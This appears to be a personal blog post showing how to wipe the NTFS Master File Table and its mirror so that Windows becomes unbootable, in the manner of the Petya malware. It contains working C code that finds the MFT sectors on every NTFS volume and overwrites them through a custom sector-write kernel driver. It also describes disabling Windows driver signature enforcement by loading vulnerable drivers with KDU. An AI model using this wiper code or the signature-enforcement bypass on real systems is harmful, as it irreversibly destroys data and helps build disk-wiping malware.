<!DOCTYPE html>
<html lang="en" data-theme="">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Wiping the MFT from NTFS and Making Windows Unbootable - fxrstor</title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,600;0,700;1,700&family=Inter:wght@300;400;600&family=Fira+Code&display=swap" rel="stylesheet">

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/x86asm.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/plugins/autoloader/highlightjs-autoloader.min.js"></script>

  <link rel="stylesheet" href="../../blogpost.css">
</head>
<body>
  <header class="bp-header" role="banner" aria-label="Post header">
    <div class="bp-header-inner">
      <div class="bp-meta-left">
        <img class="gh-avatar" src="https://avatars.githubusercontent.com/u/132809543" alt="GitHub avatar for fxrstor" width="72" height="72" />
        <div class="bp-title-wrap">
          <h1 class="bp-title">Wiping the MFT from NTFS and Making Windows Unbootable</h1>
          <p class="bp-sub">by <strong>fxrstor</strong> · 10-13 minute read</p>
        </div>
      </div>

      <nav class="bp-nav" role="navigation" aria-label="Post navigation">
        <a id="go-back" class="nav-btn" href="/" title="Home" aria-label="Go to home (root)">
          <i class="fa fa-home" aria-hidden="true"></i>
          <span class="nav-text">Home</span>
        </a>

        <a class="nav-btn" href="https://github.com/fxrstor" target="_blank" rel="noopener noreferrer" title="Open GitHub profile" aria-label="Open GitHub profile">
          <i class="fa fa-github" aria-hidden="true"></i>
          <span class="nav-text">GitHub</span>
        </a>
      </nav>
    </div>
  </header>

  <main class="bp-main" role="main">
    <article class="post-article" itemscope itemtype="http://schema.org/Article">
      <header class="article-head">
        <h2 class="reading-meta">September 11, 2025 --- 10-13 Minute Read</h2>
        <hr>
      </header>

    <section class="article-body" itemprop="articleBody">
        <h3>Disclaimer</h3>
        <p><b>This article is not meant to be a tutorial. Do not replicate actions shown here on real hardware! Only if you both <i>know what you're doing and really understand it</i> and that you're in a Virtual Machine.</b></p>
        <p><i>I, fxrstor, am not at fault for anything you do with this article.</i> You are 100% to blame if something occurs.</p>

        <h3>Introduction</h3>
        <p>The MFT, also known as the Master File Table, is a key part of the NTFS filesystem - it is a table of <i>every file</i> on the filesystem, meaning if it is somehow corrupted or <a href="https://en.wikipedia.org/wiki/Petya_(malware_family)" target="_blank" rel="noopener noreferrer">encrypted</a>, then file recovery is potentially not possible. Luckily, there is a mirror (called the MFT Mirror), which is used if the original MFT is not accessible, stored at 2 different physical places on the disk.</p>
        <p>Petya is a known example of a malware strain that does this, even with <code>bootrec /fixmbr</code> to remove the MBR Locker payload, you <i>cannot</i> access/boot into Windows due to the missing MFT.</p>

        <h3 id="#using-ioctl-to-get-mft-size">Locating MFT and retrieving its size via IOCTLs</h3>
        <p>MFT is spread across multiple sectors potentially hundreds of them. It is not contigious either which means it's not sequential and continous across sectors. We shall use Windows API to actually get MFT's location. It also provides us with the size of MFT. On top of that, we will also locate MFT mirror, which is like a small backup of MFT. Conventionally, It stores 4 records so it's just a copy of beginning of the MFT.</p>

        <h4>Enumerating NTFS disks on the system</h4>
        <p>To enumerate all the disks, first we need to get all the letters of the disks connected via <code><b>GetLogicalDrives()</b></code> function of WinAPI. It returns a DWORD (unsigned long, 32 bit integer). Each bit corresponds to one driver letter. For example, bit 0 means A: drive, bit 1 means B:, bit 2 means C: and so on. If the bit is 1, that drive exists; if it's 0, it doesn't exist. Then we can use a for loop as shown below to enumerate the letters: </p>
        
        <div class="container">
        <pre><code class="language-c">for (char letter = 'A'; letter <= 'Z'; ++letter) {
    if (!(drives & (1u << (letter - 'A')))) continue;
}</code></pre>
        </div>

        <p><code>letter - 'A'</code> calculates the bit index for that letter, for example: <br>
        <code>'A' - 'A' = 0</code> -> checks bit 0 <br>
        <code>'B' - 'A' = 1</code> -> checks bit 1 <br>
        <code>'C' - 'A' = 2</code> -> checks bit 2 <br>
        and so on. <br>
        <code>1u << (letter - 'A')</code> creates a mask to check that bit. <br>
        Example: For 'C', <code>1u << 2</code> -> 0b100 <br>
        <code>drives & mask</code> checks if the bit is set. <br>
        If 0 -> drive doesn't exist -> skip with continue; <br>
        If 1 -> drive exists -> process it. <br>
        Okay, this was the only tricky part. Once we know a drive letter exists, we build its path and use <code><b>GetDriveTypeA()</b></code> to ensure it is not <i>DRIVE_UNKNOWN</i> (type cannot be determined) or <i>DRIVE_NO_ROOT_DIR</i> (root directory doesn't exist). Next, we call <code><b>GetVolumeInformationA()</b></code> to get the filesystem name. If the filesystem is NTFS, we construct a volume path and open it as a read-only device using <code><b>CreateFileW()</b></code> function (administrative privileges required). By using <code><b>DeviceIoControl()</b></code> with the <i>FSCTL_GET_NTFS_VOLUME_DATA</i> IOCTL, we can get a <i>NTFS_VOLUME_DATA_BUFFER</i> structure that contains all the information we need about the NTFS volume. </p>

        <p>Let's look at what the <code>NTFS_VOLUME_DATA_BUFFER</code> structure contains related to MFT:</p>

        <table border="1" cellpadding="6" cellspacing="0">
        <thead>
            <tr>
            <th>Member</th>
            <th>Meaning</th>
            </tr>
        </thead>
        <tbody>
            <tr>
            <td>BytesPerSector</td>
            <td>Number of bytes per physical sector on the volume.</td>
            </tr>
            <tr>
            <td>BytesPerCluster</td>
            <td>Number of bytes per cluster (allocation unit).</td>
            </tr>
            <tr>
            <td>BytesPerFileRecordSegment</td>
            <td>Size of each File Record Segment in the MFT.</td>
            </tr>
            <tr>
            <td>MftStartLcn</td>
            <td>Logical Cluster Number (LCN) where the MFT starts.</td>
            </tr>
            <tr>
            <td>Mft2StartLcn</td>
            <td>LCN of the MFT mirror (backup copy, usually 4 records long).</td>
            </tr>
            <tr>
            <td>MftValidDataLength</td>
            <td>Actual size of the MFT in bytes.</td>
            </tr>
        </tbody>
        </table>
        <hr>

        <p>Try printing their values to console like this: </p>
        <div class="container">
        <pre><code class="language-c">DWORD drives = GetLogicalDrives();
if (drives == 0) {
  printf("GetLogicalDrives failed");
  return 1;
}

printf("Scanning logical drives A:..Z: for NTFS volumes\n\n");

for (char letter = 'A'; letter <= 'Z'; ++letter) {
  if (!(drives & (1u << (letter - 'A')))) continue;

  char rootPath[8] = { 0 };
  snprintf(rootPath, sizeof(rootPath), "%c:\\", letter);

  UINT driveType = GetDriveTypeA(rootPath);
  if (driveType == DRIVE_NO_ROOT_DIR || driveType == DRIVE_UNKNOWN) continue;

  char fsName[MAX_PATH + 1] = { 0 };
  if (!GetVolumeInformationA(rootPath, NULL, 0, NULL, NULL, NULL, fsName, sizeof(fsName)))
    continue; // skip if cannot get info

  if (_stricmp(fsName, "NTFS") != 0)
    continue; // skip if not NTFS

  char volDevicePath[16];
  snprintf(volDevicePath, sizeof(volDevicePath), "\\\\.\\%c:", letter);

  printf("Volume %c: (path %s) -> NTFS\n", letter, volDevicePath);
  HANDLE hVolume = CreateFileA(volDevicePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
  if (hVolume == INVALID_HANDLE_VALUE) {
    printf("CreateFile for volume failed\n");
    continue;
  }

  NTFS_VOLUME_DATA_BUFFER nvdb;
  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hVolume, FSCTL_GET_NTFS_VOLUME_DATA, NULL, 0, &nvdb, sizeof(nvdb), &bytesReturned, NULL)) {
    printf("FSCTL_GET_NTFS_VOLUME_DATA failed\n");
    CloseHandle(hVolume);
    continue;
  }

  STORAGE_DEVICE_NUMBER sdn = { 0 };
  BOOL sdnOk = DeviceIoControl(hVolume, IOCTL_STORAGE_GET_DEVICE_NUMBER, NULL, 0, &sdn, sizeof(STORAGE_DEVICE_NUMBER), &bytesReturned, NULL);
  if (!sdnOk || sdn.DeviceType != FILE_DEVICE_DISK) {
    printf("Failed to get storage device number\n");
    CloseHandle(hVolume);
    continue;
  }

  LONGLONG mftVolumeByte = nvdb.MftStartLcn.QuadPart * nvdb.BytesPerCluster;
  LONGLONG mftVolumeRelativeSector = mftVolumeByte / nvdb.BytesPerSector;
  LONGLONG mftSizeInSectors = nvdb.MftValidDataLength.QuadPart / nvdb.BytesPerSector;
  LONGLONG mftMirrorVolumeByte = nvdb.Mft2StartLcn.QuadPart * nvdb.BytesPerCluster;
  LONGLONG mftMirrorVolumeRelativeSector = mftMirrorVolumeByte / nvdb.BytesPerSector;
  DWORD mftMirrorSizeConventional = nvdb.BytesPerFileRecordSegment * 4;
  DWORD mftMirrorSizeInSectors = mftMirrorSizeConventional / nvdb.BytesPerSector;

  printf("  BytesPerSector: %lu, BytesPerCluster: %lu\n", nvdb.BytesPerSector, nvdb.BytesPerCluster);
  printf("  BytesPerFileRecordSegment: %lu\n", nvdb.BytesPerFileRecordSegment);
  printf("  MFT LCN: %lld  -> volume byte offset: %lld\n", nvdb.MftStartLcn.QuadPart, mftVolumeByte);
  printf("  MFT volume-relative sector: %lld sector\n", mftVolumeRelativeSector);
  printf("  MFT size (MftValidDataLength): %lld bytes\n", nvdb.MftValidDataLength.QuadPart);
  printf("  MFT size in number of sectors: %lld sectors\n", mftSizeInSectors);
  printf("  MFTMirr LCN: %lld -> volume byte offset: %llu\n", nvdb.Mft2StartLcn.QuadPart, mftMirrorVolumeByte);
  printf("  MFTMirr volume-relative sector: %lld sector\n", mftMirrorVolumeRelativeSector);
  printf("  MFTMirr conventional size: %lu bytes (4 * fileRecordSize)\n", mftMirrorSizeConventional);
  printf("  MFTMirr conventional size in sectors: %lu sectors\n", mftMirrorSizeInSectors);

  CloseHandle(hVolume);
  printf("\n");
}</code></pre>
        </div>
        <p>Running the above code, we get the following output:</p>
        <div class="container">
        <pre><code class="language-plaintext">Scanning logical drives A:..Z: for NTFS volumes

Volume C: (path \\.\C:) -> NTFS
  BytesPerSector: 512, BytesPerCluster: 4096
  BytesPerFileRecordSegment: 1024
  MFT LCN: 786432  -> volume byte offset: 3221225472
  MFT volume-relative sector: 6291456 sector
  MFT size (MftValidDataLength): 1550581760 bytes
  MFT size in number of sectors: 3028480 sectors
  MFTMirr LCN: 2 -> volume byte offset: 8192
  MFTMirr volume-relative sector: 16 sector
  MFTMirr conventional size: 4096 bytes (4 * fileRecordSize)
  MFTMirr conventional size in sectors: 8 sectors

Volume D: (path \\.\D:) -> NTFS
  BytesPerSector: 512, BytesPerCluster: 4096
  BytesPerFileRecordSegment: 1024
  MFT LCN: 786432  -> volume byte offset: 3221225472
  MFT volume-relative sector: 6291456 sector
  MFT size (MftValidDataLength): 363331584 bytes
  MFT size in number of sectors: 709632 sectors
  MFTMirr LCN: 2 -> volume byte offset: 8192
  MFTMirr volume-relative sector: 16 sector
  MFTMirr conventional size: 4096 bytes (4 * fileRecordSize)
  MFTMirr conventional size in sectors: 8 sectors

Volume E: (path \\.\E:) -> NTFS
  BytesPerSector: 512, BytesPerCluster: 4096
  BytesPerFileRecordSegment: 1024
  MFT LCN: 786432  -> volume byte offset: 3221225472
  MFT volume-relative sector: 6291456 sector
  MFT size (MftValidDataLength): 2883584 bytes
  MFT size in number of sectors: 5632 sectors
  MFTMirr LCN: 2 -> volume byte offset: 8192
  MFTMirr volume-relative sector: 16 sector
  MFTMirr conventional size: 4096 bytes (4 * fileRecordSize)
  MFTMirr conventional size in sectors: 8 sectors</code></pre>
        </div>
        <p>That looks great. MFT LCN is the location of MFT, LCN meaning Logical Cluster Number (cluster index inside that volume). To calculate the volume byte offset, we just multiply the LCN with BytesPerCluster. If we divide the volume byte offset with bytes per sector, we get the volume relative sector index of the MFT. One thing to note is that we cannot get the MFT mirror size very easily hence we're assuming it 4 records long which is quite common. </p> 
        <p>We see the below thing if we open those sectors in our hex editor (HxD)</p>
        <p><img src="res/11-wipemft/mftmirr-hxd.png" alt="Hex editor showing MFT mirror" /></p>
        <p><img src="res/11-wipemft/mft-hxd.png" alt="Hex editor showing MFT" /></p>
        
        <p>As expected both the sectors are identical as it should be. Should we trash those sectors? Yes! why not? And that is exactly what we're going to do. Unlike the previous method which we used, which wiped a single sector from MBR, in this method, we're going to utilize a kernel driver to do the task for us. I have developed a driver that allows us to arbitrarily read and write sectors a while ago. It can be found at <a href="https://github.com/fxrstor/SectorIO">https://github.com/fxrstor/SectorIO. </a></p>

        <h4>How does SectorIO work?</h4>
        <p>We aren't going to deep into its internals but the logic is fairly simple. </p>
        <p> It maintains a complete list of storage devices in the system and can directly read or write to individual sectors. It asks Windows for all disk, partition, volume, and CD-ROM interfaces to build the list of devices. It uses <code>IoGetDeviceInterfaces()</code> to get symbolic links for each interface, then converts these links into device objects with <code>IoGetDeviceObjectPointer()</code>. For each device, it gathers its information like disk size, partitions, sector size, etc. using standard IOCTLs (it's like a query to Windows asking for information or to do some task) like <code>IOCTL_STORAGE_GET_DEVICE_NUMBER</code>, <code>IOCTL_DISK_GET_PARTITION_INFO_EX</code>, and <code>IOCTL_DISK_GET_DRIVE_GEOMETRY_EX</code>. These details are stored in a list of storage objects. When performing I/O, the driver creates an IRP (I/O Request Packet) - basically a message telling the storage device what to do. This IRP is sent down the device stack, which is a chain of drivers that handle requests for a device. Once the operation completes, the driver is notified through a completion routine and returns the result. </p>

        <h3>The MFT Wiping Part</h3>
        <p>Now comes the most awaited part, how do we actually wipe or modify the MFT?  Well we just install the driver and send a write IOCTL to it zero data so it zeroes out the sectors. There's a problem, you can't just install any random driver from the internet or even your own built ones. You need to get it signed by Microsoft who will check and verify your code if it's not malicious and also charge a ton of money. This is the only way corporations can have their drivers. Corporations are obligated to get their drivers signed but not individuals ;). There are 2 workarounds: 1. Bypass/disable driver signature enforcement (DSE) 2. Enable test-signing mode. The second option is a bit uninteresting as it requires you to set some BCD flags, reboot and enter into a "test mode Windows" with a watermark, that is definitely something which we don't want. The first option is basically to just bypass the checks Windows does when loading a driver. There can be a few ways to do this, one of them is to use a vulnerable driver that allows arbitrary kernel memory read/write. You can use such drivers to load your drivers (a bit oversimplified, this is a lot complicated). For the sake of simplicity, we will not dive deep into how it really works under the hood. We will use a software called <a href="https://github.com/hfiref0x/KDU">Kernel Driver Utility (KDU)</a> which is able to set the DSE value to 0 (false, disabled) by using a lot of vulnerable drivers (you get to select which one to use). This way we can load our driver without any hassle. </p>

        <p>We have compiled KDU and SectorIO from their source. In KDU, we need kdu.exe output from Hamakaze and drv64.dll from Tanikaze project. We can disable DSE by the command shown in the image.</p>
        <p><img src="res/11-wipemft/kdu-setting-dse-value-to-0.png" alt="KDU setting DSE value to zero" /></p>
        We selected the provider 54 (you can select anything but just make sure that it's not blacklisted). Provider basically means which vulnerable driver to use. KDU shows that the DSE value was 6 and now it set it to 0. We need to set back the value to 6 once we're done starting our driver otherwise Patch Guard will bug check the system (i.e. BSOD). Now we can start our driver using <code>sc create</code> command.
        <p><img src="res/11-wipemft/starting-driver-and-restoring-dse-value.png" alt="Creating SectorIO service using sc create command and restoring DSE value" /></p>

        <p>Let's write some code to wipe MFT and the MFT mirror. We'll create a function called WipeSectors and the code goes like this: </p>
        <div class="container">
        <pre><code class="language-c">void WipeSectors(HANDLE hDevice, BOOLEAN isRawDiskObject, ULONG diskIndex, ULONG partitionNumber, ULONGLONG sectorNumber, ULONG sectorSize, ULONG nSectors) {
  UCHAR* writeBuffer = (UCHAR*)malloc(nSectors * sectorSize);
  if (!writeBuffer) {
    printf("Error: Out of memory for wipe buffer\n");
    return;
  }

  STORAGE_LOCATION writeLoc = { 0 };
  writeLoc.isRawDiskObject = isRawDiskObject;
  writeLoc.diskIndex = diskIndex;
  writeLoc.partitionNumber = partitionNumber;
  writeLoc.sectorNumber = sectorNumber;

  for (size_t i = 0; i < (size_t)nSectors * sectorSize; i++) {
    switch (i & 3) {
      case 0: writeBuffer[i] = 0xAB; break;
      case 1: writeBuffer[i] = 0xCD; break;
      case 2: writeBuffer[i] = 0xEF; break;
      default: writeBuffer[i] = 0x01; break;
    }
  }

  DWORD bytesReturned = 0;
  BOOL ok = DeviceIoControl(hDevice, IOCTL_SECTOR_WRITE, &writeLoc, sizeof(writeLoc), writeBuffer, nSectors * sectorSize, &bytesReturned, NULL);
  if (!ok) {
    printf("IOCTL_SECTOR_WRITE failed\n");
    free(writeBuffer);
    return;
  }

  printf("Wiped %u sectors (from %llu to %llu) with pattern.\n", nSectors, sectorNumber, (unsigned long long)(sectorNumber + nSectors - 1));
  free(writeBuffer);
}</code></pre>
        </div>
        <p>You can look at <a href="https://github.com/fxrstor/SectorIO/blob/master/example.cpp">example.cpp of SectorIO</a> to see how it can be used.</p>
        <p>We can use the WipeSectors function with the location of MFT and the mirror.</p>
        <div class="container">
        <pre><code class="language-c">printf("Wiping MFT starting at sector %lld (%lld sectors)...\n", mftVolumeRelativeSector, mftSizeInSectors);
WipeSectors(hDevice, FALSE, sdn.DeviceNumber, sdn.PartitionNumber, mftVolumeRelativeSector, nvdb.BytesPerSector, (ULONG)mftSizeInSectors);

printf("Wiping MFT Mirror starting at sector %lld (%lu sectors)...\n", mftMirrorVolumeRelativeSector, mftMirrorSizeInSectors);
WipeSectors(hDevice, FALSE, sdn.DeviceNumber, sdn.PartitionNumber, mftMirrorVolumeRelativeSector, nvdb.BytesPerSector, mftMirrorSizeInSectors);</code></pre>
        </div>

        <p>Be sure to open a handle to driver before you make any IOCTLs like this: </p>
        <div class="container">
        <pre><code class="language-c">HANDLE hDevice = CreateFileA("\\\\.\\SectorIO", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
if (hDevice == INVALID_HANDLE_VALUE) {
  printf("Cannot open \\\\.\\SectorIO\n");
  return 1;
}
printf("Opened \\\\.\\SectorIO successfully.\n\n");</code></pre>
        </div>

        <h4>Running our code</h4>
        <p>Once we have everything ready, we can compile our code and check if it works. </p>
        <p><img src="res/11-wipemft/running-our-wiper-program.png" alt="Running our MFT wiper"/></p>
        <p>Let's confirm this in our hex editor</p>
        <p><img src="res/11-wipemft/wiped-mft-in-hxd.png" alt="Wiped MFT in HxD"/></p>
        <p><img src="res/11-wipemft/wiped-mft-mirr-in-hxd.png" alt="Wiped MFT Mirror in HxD"/></p>
        <p>That looks good but soon after the wiping procedure, we start to get weird errors like: </p>
        <p><img src="res/11-wipemft/errors-we-get-after-wiping-mft-1.png" alt="Some errors we get after wiping MFT"/></p>
        <p><img src="res/11-wipemft/errors-we-get-after-wiping-mft-2.png" alt="Some errors we get after wiping MFT"/></p>
        <p>We also get a sweet bug check but I don't really know the cause</p>   
        <p><img src="res/11-wipemft/bugcheck-after-wiping-mft.png" alt="Bugcheck after wiping MFT"/></p>

        <h3>Can there be other ways?</h3>
        <p>Sure there can be. One way to is manually parse the NTFS BPB on the sector 0 of a NTFS drive. This way you can get the required things like MFT and MFT mirror locations and their sizes. To wipe, you can also write a custom bootloader/MBR to wipe the sectors from boot. You can store the MFT location on sector 1 and read it on boot. </p>

        <h3>Conclusion</h3>
        <p>This was more of a proof-of-concept: No, the full source code will not be available, if you <i>really</i> want to do this, you should be able to recreate the source code from fragments.</p>
        <p>Thanks for reading! Additionally, I may be wrong about something (unlikely) - i.e. the wiping or something else. If this is the case and you know the right answer / what should be done instead, please do not hesitate to reach out to me - via an issue on the blog repo of course :)</p>
        
      </section>
    </article>
  </main>

  <footer class="bp-footer" role="contentinfo" aria-label="Footer">
    <div class="bp-footer-inner">
      <small>© <span id="year"></span> fxrstor • <a href="https://github.com/fxrstor" target="_blank" rel="noopener noreferrer">GitHub</a></small>
    </div>
  </footer>

  <script src="../../bg-scroll.js" defer></script>
  <script src="../../blogpost.js" defer></script>
</body>
</html>